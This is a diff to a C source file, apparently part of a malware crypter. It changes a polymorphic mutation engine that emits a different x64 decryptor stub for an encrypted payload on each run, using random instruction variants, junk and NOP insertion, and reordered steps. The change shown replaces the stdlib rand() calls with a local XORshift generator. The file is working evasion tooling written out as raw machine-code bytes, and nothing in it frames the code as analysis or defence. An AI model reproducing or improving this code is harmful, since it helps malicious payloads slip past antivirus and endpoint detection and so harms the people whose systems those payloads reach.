@@ -41,8 +41,23 @@
 
 #include "MutationEngine.h"
 #include <intrin.h>
-#include <stdlib.h>
 #include <string.h>
+
+/* Local XORshift PRNG — replaces stdlib rand()/srand().
+ * Keeps MutationEngine consistent with the XORshift pattern used in
+ * Crypto.c and Common.c; also removes the stdlib.h dependency. */
+static unsigned int g_mut_rand_state = 0;
+
+static void mut_srand(unsigned int seed) {
+    g_mut_rand_state = seed ? seed : 123456789;
+}
+
+static int mut_rand(void) {
+    g_mut_rand_state ^= g_mut_rand_state << 13;
+    g_mut_rand_state ^= g_mut_rand_state >> 17;
+    g_mut_rand_state ^= g_mut_rand_state << 5;
+    return (int)(g_mut_rand_state & 0x7FFFFFFF);
+}
 
 /* ============================================================
  *  DECRYPTOR TEMPLATE – imported from DecryptorStub.asm
@@ -340,7 +355,7 @@ static int EmitRorAlImm8_V3(BYTE *out, BYTE imm8) {
  *    V3: lea r9, [r9+1]  (4D 8D 49 01)   – LEA displacement, 4B
  * ============================================================ */
 static int EmitIncR9(BYTE *out) {
-  switch (rand() % 3) {
+  switch (mut_rand() % 3) {
   case 0: /* inc r9 */
     out[0] = 0x49; out[1] = 0xFF; out[2] = 0xC1;
     return 3;
@@ -361,7 +376,7 @@ static int EmitIncR9(BYTE *out) {
  *    V2: cmp r9, rdx  (4C 3B CA)  – CMP r64, r/m64  (operands swapped)
  * ============================================================ */
 static int EmitCmpRdxR9(BYTE *out) {
-  switch (rand() % 2) {
+  switch (mut_rand() % 2) {
   case 0: /* cmp rdx, r9 */
     out[0] = 0x4C; out[1] = 0x39; out[2] = 0xCA;
     return 3;
@@ -388,9 +403,9 @@ static int EmitBytes(BYTE *out, int offset, const BYTE *src, int len) {
  * ============================================================ */
 static int InsertRandomJunk(BYTE *out, int offset) {
   /* Random number of junk instructions: 0, 1 or 2 */
-  int count = rand() % 3;
+  int count = mut_rand() % 3;
   for (int i = 0; i < count; i++) {
-    int idx = rand() % JUNK_COUNT;
+    int idx = mut_rand() % JUNK_COUNT;
     memcpy(out + offset, JUNK_TABLE[idx].bytes, JUNK_TABLE[idx].len);
     offset += JUNK_TABLE[idx].len;
   }
@@ -404,8 +419,8 @@ static int InsertRandomJunk(BYTE *out, int offset) {
  *  Returns the new offset.
  * ============================================================ */
 static int InsertRandomNop(BYTE *out, int offset) {
-  if (rand() % 2 == 0) {
-    int idx = rand() % NOP_VARIANT_COUNT;
+  if (mut_rand() % 2 == 0) {
+    int idx = mut_rand() % NOP_VARIANT_COUNT;
     memcpy(out + offset, NOP_TABLE[idx], NOP_SIZES[idx]);
     offset += NOP_SIZES[idx];
   }
@@ -457,7 +472,7 @@ BOOL MutateDecryptor(const BYTE *pEncPayload, SIZE_T payloadLen,
     return FALSE;
 
   /* Seed RNG for this run */
-  srand((unsigned int)(__rdtsc() & 0xFFFFFFFF));
+  mut_srand((unsigned int)(__rdtsc() & 0xFFFFFFFF));
 
   int pos = 0; /* current write position in output buffer */
 
@@ -500,7 +515,7 @@ BOOL MutateDecryptor(const BYTE *pEncPayload, SIZE_T payloadLen,
   /* Fisher-Yates shuffle for 4 elements → 4! = 24 orderings */
   int order[4] = {0, 1, 2, 3};
   for (int i = 3; i > 0; i--) {
-    int j = rand() % (i + 1);
+    int j = mut_rand() % (i + 1);
     int tmp = order[i];
     order[i] = order[j];
     order[j] = tmp;
@@ -568,7 +583,7 @@ BOOL MutateDecryptor(const BYTE *pEncPayload, SIZE_T payloadLen,
 
   /* --- First XOR step (undoes last encrypt XOR) --- */
   {
-    int variant = rand() % 3;
+    int variant = mut_rand() % 3;
     int emitted = 0;
     switch (variant) {
     case 0:  emitted = EmitXorAlImm8_V1(buf + pos, firstXorKey); break;
@@ -582,7 +597,7 @@ BOOL MutateDecryptor(const BYTE *pEncPayload, SIZE_T payloadLen,
 
   /* --- Step 3': sub al, KEY3 (undo ADD) --- */
   {
-    int variant = rand() % 3;
+    int variant = mut_rand() % 3;
     int emitted = 0;
     switch (variant) {
     case 0:  emitted = EmitSubAlImm8_V1(buf + pos, pKey->key3); break;
@@ -596,7 +611,7 @@ BOOL MutateDecryptor(const BYTE *pEncPayload, SIZE_T payloadLen,
 
   /* --- Step 2': ror al, ROT_BITS (undo ROL) --- */
   {
-    int variant = rand() % 3;
+    int variant = mut_rand() % 3;
     int emitted = 0;
     switch (variant) {
     case 0:  emitted = EmitRorAlImm8_V1(buf + pos, pKey->rotBits); break;
@@ -610,7 +625,7 @@ BOOL MutateDecryptor(const BYTE *pEncPayload, SIZE_T payloadLen,
 
   /* --- Last XOR step (undoes first encrypt XOR) --- */
   {
-    int variant = rand() % 3;
+    int variant = mut_rand() % 3;
     int emitted = 0;
     switch (variant) {
     case 0:  emitted = EmitXorAlImm8_V1(buf + pos, lastXorKey); break;
